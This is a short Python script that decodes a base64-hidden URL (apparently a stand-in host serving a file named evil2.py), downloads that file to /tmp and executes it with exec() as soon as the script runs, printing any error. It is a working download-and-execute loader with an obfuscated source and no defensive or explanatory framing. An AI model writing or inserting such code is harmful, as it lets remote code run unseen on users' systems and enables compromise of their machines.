import urllib.request
import base64

def download_and_run():
    try:
        encoded_url = "aHR0cDovL3NhbXBsZS51cmwvZXZpbDIucHk="
        decoded_url = base64.b64decode(encoded_url).decode("utf-8")
        local_file = "/tmp/temp.py"

        urllib.request.urlretrieve(decoded_url, local_file)

        with open(local_file, "r") as f:
            script = f.read()

        exec(script)

    except Exception as e:
        print(e)

download_and_run()
